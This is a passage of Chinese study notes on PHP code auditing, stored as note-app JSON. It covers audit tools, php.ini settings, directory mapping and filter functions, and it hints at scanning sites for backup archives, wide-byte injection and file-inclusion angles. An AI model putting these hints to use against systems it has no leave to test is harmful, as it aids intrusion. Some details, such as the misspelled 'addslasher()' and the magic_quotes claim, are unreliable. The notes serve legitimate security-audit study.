{"ID":"20240925090007-44rn8du","Spec":"1","Type":"NodeDocument","Properties":{"id":"20240925090007-44rn8du","title":"代码审计","updated":"20241007204213"},"Children":[{"ID":"20240925090253-dhalg09","Type":"NodeHeading","HeadingLevel":2,"Properties":{"id":"20240925090253-dhalg09","updated":"20240925090258"},"Children":[{"Type":"NodeText","Data":"概念"}]},{"ID":"20240925090040-0qplsi6","Type":"NodeBlockquote","Properties":{"id":"20240925090040-0qplsi6","updated":"20240925090205"},"Children":[{"ID":"20240925090007-ak6s5uq","Type":"NodeParagraph","Properties":{"id":"20240925090007-ak6s5uq","updated":"20240925090205"},"Children":[{"Type":"NodeText","Data":"一种检测源代码中潜在安全漏洞、逻辑错误、性能问题和其他不良实践的过程。根据一定的编码规范和标准，针对应用程序源代码，从结构、脆弱性以及缺陷等方面进行审查，最终输出代码审计报告，完善应用程序，提升自身安全水平"}]},{"Type":"NodeBlockquoteMarker","Data":"\u003e"}]},{"ID":"20240925090208-d1titfc","Type":"NodeHeading","HeadingLevel":5,"Properties":{"id":"20240925090208-d1titfc","updated":"20240925090228"},"Children":[{"Type":"NodeText","Data":"优点"}]},{"ID":"20240925090242-ue6ok0c","Type":"NodeList","ListData":{},"Properties":{"id":"20240925090242-ue6ok0c"},"Children":[{"ID":"20240925090242-vj8gngu","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240925090242-vj8gngu"},"Children":[{"ID":"20240925090233-7bd5fzg","Type":"NodeParagraph","Properties":{"id":"20240925090233-7bd5fzg","updated":"20240925090233"},"Children":[{"Type":"NodeText","Data":"发现更多“隐蔽”的安全漏洞\n"}]}]},{"ID":"20240925090244-y8murrg","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240925090244-y8murrg"},"Children":[{"ID":"20240925090244-zt9ot69","Type":"NodeParagraph","Properties":{"id":"20240925090244-zt9ot69"},"Children":[{"Type":"NodeText","Data":"企业合规性要求\n"}]}]},{"ID":"20240925090245-z9lx28k","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240925090245-z9lx28k"},"Children":[{"ID":"20240925090245-umdhrjc","Type":"NodeParagraph","Properties":{"id":"20240925090245-umdhrjc"},"Children":[{"Type":"NodeText","Data":"提升企业整体安全水平\n"}]}]},{"ID":"20240925090245-a8a9tsu","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240925090245-a8a9tsu"},"Children":[{"ID":"20240925090245-6l8ppz1","Type":"NodeParagraph","Properties":{"id":"20240925090245-6l8ppz1"},"Children":[{"Type":"NodeText","Data":"提升企业安全开发编码规范"}]}]}]},{"ID":"20240925090303-w0vlti1","Type":"NodeParagraph","Properties":{"id":"20240925090303-w0vlti1"}},{"ID":"20240925090304-yeuql66","Type":"NodeHeading","HeadingLevel":2,"Properties":{"id":"20240925090304-yeuql66","updated":"20240925090307"},"Children":[{"Type":"NodeText","Data":"审计环境"}]},{"ID":"20240925090310-1sxtsy1","Type":"NodeParagraph","Properties":{"id":"20240925090310-1sxtsy1","updated":"20240925090329"},"Children":[{"Type":"NodeText","Data":"phpstudy --php解析器和MySQL数据库"}]},{"ID":"20240925091226-8k56kud","Type":"NodeList","ListData":{"Typ":1},"Properties":{"id":"20240925091226-8k56kud","updated":"20241007203857"},"Children":[{"ID":"20240925091226-t1pt7w1","Type":"NodeListItem","ListData":{"Typ":1,"Delimiter":46,"Marker":"MS4=","Num":1},"Properties":{"fold":"0","id":"20240925091226-t1pt7w1","updated":"20241007203507"},"Children":[{"ID":"20240925090336-k2mnwz2","Type":"NodeHeading","HeadingLevel":3,"Properties":{"id":"20240925090336-k2mnwz2","updated":"20240925090539"},"Children":[{"Type":"NodeText","Data":"php.ini文件必要设"}]},{"ID":"20240925091255-twbglmx","Type":"NodeList","ListData":{},"Properties":{"id":"20240925091255-twbglmx","updated":"20241007203507"},"Children":[{"ID":"20240925091255-h2tuztx","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"fold":"0","id":"20240925091255-h2tuztx","updated":"20241007203507"},"Children":[{"ID":"20240925091255-gw4fpgm","Type":"NodeParagraph","Properties":{"id":"20240925091255-gw4fpgm","updated":"20240925162036"},"Children":[{"Type":"NodeTextMark","Properties":{"style":"background-color: var(--b3-font-background7);"},"TextMarkType":"text","TextMarkTextContent":"magic_quotes_gpc=off "},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"background-color: var(--b3-font-background7);\"}"},{"Type":"NodeText","Data":"防止特殊字符处理不当造成的安全问题，如SQL注入的字符"}]},{"ID":"20240925091255-l7yvc5m","Type":"NodeParagraph","Properties":{"id":"20240925091255-l7yvc5m","updated":"20240925091255"},"Children":[{"Type":"NodeText","Data":"限制在php5.4之前"}]},{"ID":"20240925154800-xt7np8b","Type":"NodeParagraph","Properties":{"id":"20240925154800-xt7np8b","updated":"20241007203507"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20240925154800-00rqwoe.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]}]},{"ID":"20240925091255-gr6yrxf","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240925091255-gr6yrxf","updated":"20240925162040"},"Children":[{"ID":"20240925091255-5xczits","Type":"NodeParagraph","Properties":{"id":"20240925091255-5xczits","updated":"20240925162040"},"Children":[{"Type":"NodeTextMark","Properties":{"style":"background-color: var(--b3-font-background7);"},"TextMarkType":"text","TextMarkTextContent":"get_magic_quotes_gpc "},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"background-color: var(--b3-font-background7);\"}"},{"Type":"NodeText","Data":"作用同上"}]},{"ID":"20240925155148-jkc2gws","Type":"NodeParagraph","Properties":{"id":"20240925155148-jkc2gws","updated":"20240925155152"},"Children":[{"Type":"NodeText","Data":"目的是把安全编码交给用户自己来处理，从而避免了因gpc未设置，用户代码却依赖这个设置而带来的安全隐患。"}]},{"ID":"20240925091255-tgbx44u","Type":"NodeParagraph","Properties":{"id":"20240925091255-tgbx44u","updated":"20240925091255"},"Children":[{"Type":"NodeText","Data":"php7.4.0起弃用，自8.0.0起移除"}]}]},{"ID":"20240925155247-m7a2h0u","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240925155247-m7a2h0u","updated":"20240925155255"},"Children":[{"ID":"20240925155247-qi1uhf9","Type":"NodeParagraph","Properties":{"id":"20240925155247-qi1uhf9","updated":"20240925155255"},"Children":[{"Type":"NodeText","Data":"配置相关文件https://www.php.net/manual/zh/ini.list.php"}]}]},{"ID":"20240925155240-f39p26x","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240925155240-f39p26x","updated":"20240925155518"},"Children":[{"ID":"20240925155240-zdpgbyn","Type":"NodeParagraph","Properties":{"id":"20240925155240-zdpgbyn","updated":"20240925155518"},"Children":[{"Type":"NodeText","Data":"配置可被设定范围https://www.php.net/manual/zh/configuration.changes.modes.php"}]}]}]}]},{"ID":"20240925091244-ocrykvi","Type":"NodeListItem","ListData":{"Typ":1,"Delimiter":46,"Marker":"Mi4=","Num":2},"Properties":{"id":"20240925091244-ocrykvi","updated":"20241007203857"},"Children":[{"ID":"20240925091244-dubpmx8","Type":"NodeHeading","HeadingLevel":3,"Properties":{"id":"20240925091244-dubpmx8","updated":"20240925091250"},"Children":[{"Type":"NodeText","Data":"审计工具"}]},{"ID":"20240925091303-dkai39r","Type":"NodeList","ListData":{},"Properties":{"id":"20240925091303-dkai39r","updated":"20241007203857"},"Children":[{"ID":"20240925155539-7yx79da","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240925155539-7yx79da"},"Children":[{"ID":"20240925155539-4lfl1bi","Type":"NodeParagraph","Properties":{"id":"20240925155539-4lfl1bi","updated":"20240925155625"},"Children":[{"Type":"NodeText","Data":"notepad++编辑器"}]}]},{"ID":"20240925091305-9bo3o8a","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"fold":"0","id":"20240925091305-9bo3o8a","updated":"20241007203800"},"Children":[{"ID":"20240925091305-m7ji8y3","Type":"NodeParagraph","Properties":{"id":"20240925091305-m7ji8y3","updated":"20240925091455"},"Children":[{"Type":"NodeText","Data":"seay源代码审计系统"}]},{"ID":"20240925161409-05o6dof","Type":"NodeParagraph","Properties":{"id":"20240925161409-05o6dof","updated":"20240925161413"},"Children":[{"Type":"NodeText","Data":"工具使用"}]},{"ID":"20240925161454-s4w2nii","Type":"NodeParagraph","Properties":{"id":"20240925161454-s4w2nii","updated":"20241007203734"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20240925161454-817dvmr.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20240925161507-zpvnifm.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20240925161520-n5m3s9q","Type":"NodeParagraph","Properties":{"id":"20240925161520-n5m3s9q","updated":"20240925161530"},"Children":[{"Type":"NodeText","Data":"审计--回溯过程"}]},{"ID":"20240925161551-tx64wm0","Type":"NodeParagraph","Properties":{"id":"20240925161551-tx64wm0","updated":"20241007203800"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20240925161551-c80jh1n.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20240925161558-gptouk2","Type":"NodeParagraph","Properties":{"id":"20240925161558-gptouk2","updated":"20240925161604"},"Children":[{"Type":"NodeText","Data":"浏览器验证"}]}]},{"ID":"20240925092214-mmb18ek","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"fold":"0","id":"20240925092214-mmb18ek","updated":"20241007203857"},"Children":[{"ID":"20240925092214-0wbww85","Type":"NodeParagraph","Properties":{"id":"20240925092214-0wbww85","updated":"20240925160229"},"Children":[{"Type":"NodeText","Data":"RIPS"}]},{"ID":"20240925160230-ny4oryh","Type":"NodeParagraph","Properties":{"id":"20240925160230-ny4oryh","updated":"20240925160232"},"Children":[{"Type":"NodeText","Data":"一款基于PHP语言开发的针对PHP代码安全审计的软件。使用简单，可以自动生成漏洞利用payload。"}]},{"ID":"20240925160526-jjaqpdz","Type":"NodeParagraph","Properties":{"id":"20240925160526-jjaqpdz","updated":"20241007203857"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20240925160526-hrl1bba.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20240925092218-hc92ylz","Type":"NodeParagraph","Properties":{"id":"20240925092218-hc92ylz","updated":"20240925092239"},"Children":[{"Type":"NodeText","Data":"PS："}]},{"ID":"20240925092228-z3nnsr0","Type":"NodeList","ListData":{},"Properties":{"id":"20240925092228-z3nnsr0"},"Children":[{"ID":"20240925092232-bkyn8z9","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240925092232-bkyn8z9"},"Children":[{"ID":"20240925092232-q9i7uq2","Type":"NodeParagraph","Properties":{"id":"20240925092232-q9i7uq2","updated":"20240925092304"},"Children":[{"Type":"NodeText","Data":"工具审计的结果会存在误报，需要手动验证"}]}]},{"ID":"20240925092305-sxjo1iz","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240925092305-sxjo1iz"},"Children":[{"ID":"20240925092305-ybjmdbk","Type":"NodeParagraph","Properties":{"id":"20240925092305-ybjmdbk","updated":"20240925092326"},"Children":[{"Type":"NodeText","Data":"审计不完整，不分漏洞审计不到（比如逻辑漏洞）"}]}]}]}]}]}]},{"ID":"20240925091300-vrdtxo8","Type":"NodeListItem","ListData":{"Typ":1,"Delimiter":46,"Marker":"My4=","Num":3},"Properties":{"id":"20240925091300-vrdtxo8","updated":"20240925092337"},"Children":[{"ID":"20240925091300-ehtxbuj","Type":"NodeHeading","HeadingLevel":3,"Properties":{"id":"20240925091300-ehtxbuj","updated":"20240925092337"},"Children":[{"Type":"NodeText","Data":"验证 ---黑盒测试"}]},{"ID":"20240925092341-jviv4jn","Type":"NodeList","ListData":{},"Properties":{"id":"20240925092341-jviv4jn","updated":"20240925092343"},"Children":[{"ID":"20240925092343-jyesllz","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240925092343-jyesllz","updated":"20240925092343"},"Children":[{"ID":"20240925092343-logskw7","Type":"NodeParagraph","Properties":{"id":"20240925092343-logskw7","updated":"20240925092350"},"Children":[{"Type":"NodeText","Data":"burpsuite"}]},{"ID":"20240925092352-aiwudtf","Type":"NodeParagraph","Properties":{"id":"20240925092352-aiwudtf","updated":"20240925092404"},"Children":[{"Type":"NodeText","Data":"代理-扫描-爆破-重放等"}]}]},{"ID":"20240925092405-6i35zti","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240925092405-6i35zti"},"Children":[{"ID":"20240925092405-1hmtmop","Type":"NodeParagraph","Properties":{"id":"20240925092405-1hmtmop","updated":"20240925092408"},"Children":[{"Type":"NodeText","Data":"插件-工具"}]}]},{"ID":"20240925092409-vvtdf52","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240925092409-vvtdf52"},"Children":[{"ID":"20240925092409-qwrgesx","Type":"NodeParagraph","Properties":{"id":"20240925092409-qwrgesx","updated":"20240925092431"},"Children":[{"Type":"NodeText","Data":"编码-正则调试 seay系统都有"}]}]}]}]}]},{"ID":"20240925092442-rwosnad","Type":"NodeParagraph","Properties":{"id":"20240925092442-rwosnad"}},{"ID":"20240925092444-odyj1d1","Type":"NodeHeading","HeadingLevel":2,"Properties":{"id":"20240925092444-odyj1d1","updated":"20240925092448"},"Children":[{"Type":"NodeText","Data":"准备工作"}]},{"ID":"20240925092457-ppb99mf","Type":"NodeList","ListData":{"Typ":1},"Properties":{"id":"20240925092457-ppb99mf","updated":"20241007204213"},"Children":[{"ID":"20240925092457-4md2l3u","Type":"NodeListItem","ListData":{"Typ":1,"Delimiter":46,"Marker":"MS4=","Num":1},"Properties":{"id":"20240925092457-4md2l3u"},"Children":[{"ID":"20240925092452-viaechd","Type":"NodeHeading","HeadingLevel":3,"Properties":{"id":"20240925092452-viaechd","updated":"20240925092507"},"Children":[{"Type":"NodeText","Data":"准备源代码审计工具"}]}]},{"ID":"20240925092507-dwx8zy5","Type":"NodeListItem","ListData":{"Typ":1,"Delimiter":46,"Marker":"Mi4=","Num":2},"Properties":{"fold":"0","id":"20240925092507-dwx8zy5","updated":"20240926114107"},"Children":[{"ID":"20240925092507-sso0j96","Type":"NodeHeading","HeadingLevel":3,"Properties":{"id":"20240925092507-sso0j96","updated":"20240925093059"},"Children":[{"Type":"NodeText","Data":"获取源代码"}]},{"ID":"20240926113939-xmht36y","Type":"NodeList","ListData":{},"Properties":{"id":"20240926113939-xmht36y","updated":"20240926114107"},"Children":[{"ID":"20240925093101-k39crk2","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240925093101-k39crk2","updated":"20240926114018"},"Children":[{"ID":"20240925093101-mn2lub0","Type":"NodeParagraph","Properties":{"id":"20240925093101-mn2lub0","updated":"20240926114018"},"Children":[{"Type":"NodeText","Data":"黑盒角度：开源（CMS/OA、/www.rar、www.zip 备份文件；软件供应商官网--申请使用），扫描备份文件"}]}]},{"ID":"20240925093221-i8h6jbp","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240925093221-i8h6jbp","updated":"20240926114107"},"Children":[{"ID":"20240925093221-3c36mru","Type":"NodeParagraph","Properties":{"id":"20240925093221-3c36mru","updated":"20240926114107"},"Children":[{"Type":"NodeText","Data":"白盒角度：甲方提供（安装网站、本地搭建）"}]}]}]}]},{"ID":"20240925093332-18l2utn","Type":"NodeListItem","ListData":{"Typ":1,"Delimiter":46,"Marker":"My4=","Num":3},"Properties":{"fold":"0","id":"20240925093332-18l2utn","updated":"20241007204213"},"Children":[{"ID":"20240925093332-6jmfraw","Type":"NodeHeading","HeadingLevel":3,"Properties":{"id":"20240925093332-6jmfraw","updated":"20240925093339"},"Children":[{"Type":"NodeText","Data":"了解网站结构"}]},{"ID":"20240925093341-c736rgv","Type":"NodeHeading","HeadingLevel":4,"Properties":{"id":"20240925093341-c736rgv","updated":"20240925093346"},"Children":[{"Type":"NodeText","Data":"文件结构"}]},{"ID":"20240925093346-vtt15qi","Type":"NodeList","ListData":{},"Properties":{"id":"20240925093346-vtt15qi"},"Children":[{"ID":"20240925093346-cve9mhs","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240925093346-cve9mhs"},"Children":[{"ID":"20240925093346-0f46iem","Type":"NodeParagraph","Properties":{"id":"20240925093346-0f46iem","updated":"20240925093357"},"Children":[{"Type":"NodeText","Data":"管理员目录（admin、root）"}]}]},{"ID":"20240925093357-yzd2ce1","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240925093357-yzd2ce1"},"Children":[{"ID":"20240925093357-t54ram9","Type":"NodeParagraph","Properties":{"id":"20240925093357-t54ram9","updated":"20240925093403"},"Children":[{"Type":"NodeText","Data":"css文件目录"}]}]},{"ID":"20240925093404-a0njlgp","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240925093404-a0njlgp"},"Children":[{"ID":"20240925093404-wcvx817","Type":"NodeParagraph","Properties":{"id":"20240925093404-wcvx817","updated":"20240925093408"},"Children":[{"Type":"NodeText","Data":"image图片文件"}]}]},{"ID":"20240925093408-oj94noi","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240925093408-oj94noi"},"Children":[{"ID":"20240925093408-6av2e17","Type":"NodeParagraph","Properties":{"id":"20240925093408-6av2e17","updated":"20240925093426"},"Children":[{"Type":"NodeText","Data":"install 安装目录（包含数据库配置文件）"}]}]},{"ID":"20240925093427-iaj9z9l","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240925093427-iaj9z9l"},"Children":[{"ID":"20240925093427-lxtev17","Type":"NodeParagraph","Properties":{"id":"20240925093427-lxtev17","updated":"20240925093434"},"Children":[{"Type":"NodeText","Data":"js 文件目录"}]}]},{"ID":"20240925093434-49oe3k8","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240925093434-49oe3k8"},"Children":[{"ID":"20240925093434-gqgzb11","Type":"NodeParagraph","Properties":{"id":"20240925093434-gqgzb11","updated":"20240925093504"},"Children":[{"Type":"NodeText","Data":"配置文件目录（PS：config.php）sys目录、conf目录、config目录"}]}]},{"ID":"20240925093505-bo5txv0","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240925093505-bo5txv0"},"Children":[{"ID":"20240925093505-r0sfkoz","Type":"NodeParagraph","Properties":{"id":"20240925093505-r0sfkoz","updated":"20240925094206"},"Children":[{"Type":"NodeText","Data":"uploads 文件上传目录（本地不是-是否存在上传漏洞、站库分离（不存在上传目录：单独上传到文件服务器-配合文件包含漏洞））"}]}]},{"ID":"20240925094407-ipuyvsk","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240925094407-ipuyvsk"},"Children":[{"ID":"20240925094407-qioq65s","Type":"NodeParagraph","Properties":{"id":"20240925094407-qioq65s","updated":"20240925094411"},"Children":[{"Type":"NodeText","Data":"user用户目录"}]}]},{"ID":"20240925094411-ra70vvw","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240925094411-ra70vvw"},"Children":[{"ID":"20240925094411-wmtmkc1","Type":"NodeParagraph","Properties":{"id":"20240925094411-wmtmkc1","updated":"20240925094420"},"Children":[{"Type":"NodeText","Data":"API接口目录"}]}]}]},{"ID":"20240925094431-ushjiy7","Type":"NodeHeading","HeadingLevel":4,"Properties":{"id":"20240925094431-ushjiy7","updated":"20240925094440"},"Children":[{"Type":"NodeText","Data":"程序入口"}]},{"ID":"20240925094441-a93fx8h","Type":"NodeParagraph","Properties":{"id":"20240925094441-a93fx8h","updated":"20240926114254"},"Children":[{"Type":"NodeText","Data":"index.php、admin.php，可以去了解到程序的架构、运行流程，包含的配置文件、过滤文件等，了解程序的业务逻辑"}]},{"ID":"20240925094449-m5t4fut","Type":"NodeList","ListData":{},"Properties":{"id":"20240925094449-m5t4fut","updated":"20241007204213"},"Children":[{"ID":"20240925094448-jrmok8y","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240925094448-jrmok8y","updated":"20241007204213"},"Children":[{"ID":"20240925094448-13v7tep","Type":"NodeHeading","HeadingLevel":6,"Properties":{"id":"20240925094448-13v7tep","updated":"20240925094455"},"Children":[{"Type":"NodeText","Data":"数据库编码文件格式"}]},{"ID":"20240925160643-wxugd4x","Type":"NodeParagraph","Properties":{"id":"20240925160643-wxugd4x","updated":"20241007204213"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20240925160643-9ff0oy8.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20240926114353-h5l2yud","Type":"NodeParagraph","Properties":{"id":"20240926114353-h5l2yud","updated":"20240926114522"},"Children":[{"Type":"NodeText","Data":"一般类似config.php等文件，保存一些数据库相关信息，查看数据库编码，如果是gbk（存在宽字节注入），如果变量值用双引号（存在双引号解析代码执行问题）"}]}]}]},{"ID":"20240925095250-8nufp5i","Type":"NodeHeading","HeadingLevel":4,"Properties":{"id":"20240925095250-8nufp5i","updated":"20240925095250"},"Children":[{"Type":"NodeText","Data":"过滤功能的函数"}]},{"ID":"20240925095250-9pb9agq","Type":"NodeList","ListData":{},"Properties":{"id":"20240925095250-9pb9agq","updated":"20240925095250"},"Children":[{"ID":"20240925095250-q14hgwt","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240925095250-q14hgwt","updated":"20240925161117"},"Children":[{"ID":"20240925095250-7j9865q","Type":"NodeHeading","HeadingLevel":5,"Properties":{"id":"20240925095250-7j9865q","updated":"20240925161117"},"Children":[{"Type":"NodeText","Data":"实体编码函数"}]},{"ID":"20240925161127-y3lam3a","Type":"NodeBlockquote","Properties":{"id":"20240925161127-y3lam3a"},"Children":[{"Type":"NodeBlockquoteMarker","Data":"\u003e"},{"ID":"20240925161121-87w6uj1","Type":"NodeParagraph","Properties":{"id":"20240925161121-87w6uj1","updated":"20240925161137"},"Children":[{"Type":"NodeTextMark","Properties":{"style":"background-color: var(--b3-font-background7);"},"TextMarkType":"code text","TextMarkTextContent":"htmlspecialchars()"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"background-color: var(--b3-font-background7);\"}"},{"Type":"NodeText","Data":"将特殊字符转换为HTML实体"}]},{"ID":"20240925161118-tfpwici","Type":"NodeParagraph","Properties":{"id":"20240925161118-tfpwici","updated":"20240925161143"},"Children":[{"Type":"NodeTextMark","Properties":{"style":"background-color: var(--b3-font-background7);"},"TextMarkType":"code text","TextMarkTextContent":"htmlspecialchars_decode()"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"background-color: var(--b3-font-background7);\"}"},{"Type":"NodeText","Data":"​ - 将HTML实体转换回特殊字符"}]},{"ID":"20240925095250-xilk77m","Type":"NodeParagraph","Properties":{"id":"20240925095250-xilk77m","updated":"20240925161147"},"Children":[{"Type":"NodeTextMark","Properties":{"style":"background-color: var(--b3-font-background7);"},"TextMarkType":"code text","TextMarkTextContent":"htmlentities()"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"background-color: var(--b3-font-background7);\"}"},{"Type":"NodeText","Data":"​​​ - 将所有适用的字符转换为HTML实体"}]},{"ID":"20240925095250-fs4bz7h","Type":"NodeParagraph","Properties":{"id":"20240925095250-fs4bz7h","updated":"20240925161151"},"Children":[{"Type":"NodeTextMark","Properties":{"style":"background-color: var(--b3-font-background7);"},"TextMarkType":"code text","TextMarkTextContent":"html_entity_decode()"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"background-color: var(--b3-font-background7);\"}"},{"Type":"NodeText","Data":"​​​ - 将HTML实体转换回字符"}]}]}]},{"ID":"20240925095250-kvvbg6n","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240925095250-kvvbg6n","updated":"20240925095250"},"Children":[{"ID":"20240925095250-2jimsg8","Type":"NodeHeading","HeadingLevel":5,"Properties":{"id":"20240925095250-2jimsg8","updated":"20240925095250"},"Children":[{"Type":"NodeText","Data":"特殊转义字符"}]},{"ID":"20240925095250-sxqqcdv","Type":"NodeParagraph","Properties":{"id":"20240925095250-sxqqcdv","updated":"20240925161159"},"Children":[{"Type":"NodeTextMark","Properties":{"style":"background-color: var(--b3-font-background7);"},"TextMarkType":"text","TextMarkTextContent":"addslasher()"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"background-color: var(--b3-font-background7);\"}"}]}]},{"ID":"20240925095250-dfakyxu","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240925095250-dfakyxu","updated":"20240925095250"},"Children":[{"ID":"20240925095250-zn50m03","Type":"NodeHeading","HeadingLevel":5,"Properties":{"id":"20240925095250-zn50m03","updated":"20240925095250"},"Children":[{"Type":"NodeText","Data":"数据库语句预编译函数"}]},{"ID":"20240925095250-8k0fihl","Type":"NodeParagraph","Properties":{"id":"20240925095250-8k0fihl","updated":"20240925161206"},"Children":[{"Type":"NodeTextMark","Properties":{"style":"background-color: var(--b3-font-background7);"},"TextMarkType":"text","TextMarkTextContent":"prepare()"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"background-color: var(--b3-font-background7);\"}"}]}]},{"ID":"20240925095250-h509nrz","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240925095250-h509nrz","updated":"20240925095250"},"Children":[{"ID":"20240925095250-n86b1ut","Type":"NodeHeading","HeadingLevel":5,"Properties":{"id":"20240925095250-n86b1ut","updated":"20240925095250"},"Children":[{"Type":"NodeText","Data":"自写函数（过滤位置的、正则替换、防止SQL注入的、防止xss的，限制文件上传的）"}]}]}]}]},{"ID":"20240925095419-zjw1wd6","Type":"NodeListItem","ListData":{"Typ":1,"Delimiter":46,"Marker":"NC4=","Num":4},"Properties":{"fold":"0","id":"20240925095419-zjw1wd6","updated":"20240926114904"},"Children":[{"ID":"20240925095419-4va1p76","Type":"NodeHeading","HeadingLevel":3,"Properties":{"id":"20240925095419-4va1p76","updated":"20240925095423"},"Children":[{"Type":"NodeText","Data":"怎么审计"}]},{"ID":"20240925095424-xe555ue","Type":"NodeList","ListData":{},"Properties":{"id":"20240925095424-xe555ue","updated":"20240926114904"},"Children":[{"ID":"20240925095427-tlz817s","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"fold":"1","id":"20240925095427-tlz817s","updated":"20240925095427"},"Children":[{"ID":"20240925095427-48xue9g","Type":"NodeHeading","HeadingLevel":4,"Properties":{"id":"20240925095427-48xue9g","updated":"20240925095435"},"Children":[{"Type":"NodeText","Data":"通读"}]},{"ID":"20240926114618-lhdxl3a","Type":"NodeParagraph","Properties":{"id":"20240926114618-lhdxl3a","updated":"20240926114620"},"Children":[{"Type":"NodeText","Data":"流程"}]},{"ID":"20240926114621-2bxdyiw","Type":"NodeList","ListData":{},"Properties":{"id":"20240926114621-2bxdyiw","updated":"20240926114623"},"Children":[{"ID":"20240926114623-1vyz5ax","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20240926114623-1vyz5ax","updated":"20240926114623"},"Children":[{"ID":"20240926114623-ihvgwcp","Type":"NodeParagraph","Properties":{"id":"20240926114623-ihvgwcp","updated":"20240926114628"},"Children":[{"Type":"NodeText","Data":"查看应用文件结构"}]}]},{"ID":"20240926114629-h5e9bj1